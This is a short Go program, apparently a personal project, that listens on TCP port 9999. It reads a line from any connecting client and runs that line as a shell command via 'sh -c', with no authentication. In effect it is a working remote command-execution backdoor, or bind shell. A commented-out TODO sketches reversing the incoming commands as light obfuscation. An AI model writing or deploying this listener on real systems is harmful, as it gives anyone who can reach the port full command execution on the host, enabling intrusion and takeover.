package main

import (
	"fmt"
	"net"
	"bufio"
	"log"
	"strings"
	// "slices"
	"sync"
	"os/exec"
)

var (
	CONCURRENCY int = 3
)


func main() {
		listener, err := net.Listen("tcp", ":9999")
		if err != nil {
			log.Fatalf("error while bootstrapping tcp listener: aklsdjf;a: %v\n", err)
		}
		defer listener.Close() 
		fmt.Println("accepting new connections..")

		var wg sync.WaitGroup

		for i := 0; i < CONCURRENCY; i++ {
			wg.Add(1)
			go handler(&wg, &listener)
		}

		wg.Wait()
}


func handler(wg *sync.WaitGroup, listener *net.Listener) error {
		defer wg.Done()

		for {
				conn, err := (*listener).Accept()
				if err != nil {
					log.Fatalf("error accepting a new connection")
				}

				command, err := getCommand(&conn)
				runCommand(command)
		}

		return nil
}

func getCommand(conn *net.Conn) (string, error) {
		reader := bufio.NewReader(*conn)
		command, err := reader.ReadString('\n')
		if  err != nil {
			log.Print("wasn't able to read for some reason..")
			return "", err
		}
		return command, nil
}

func runCommand(command string) error {
		// defer conn.Close()
		out, err := exec.Command("sh", "-c", strings.TrimSpace(command)).Output()

		if err != nil {
			log.Fatalf("error occurred while running the command", err)
			return err
		}

		log.Println(string(out)) 
		return nil
}
































// TODO : 

	// if err != nil {
	// 	log.Error("error while reading the tcp connection")
	// }


	//decrypted, err := decrypt(message)
	//fmt.Println(strings.ToUpper(decrypted))

	// fmt.Println(message)
	// err = cmd.Run()
	// cmd := strings.Split("ps -ef") message, "


// func decrypt(v string) (string, error) {
//  //13tor
// 	// n := len(v)
// 	arr := []byte(v)
// 	slices.Reverse(arr)
// 	return string(arr), nil
// }
//
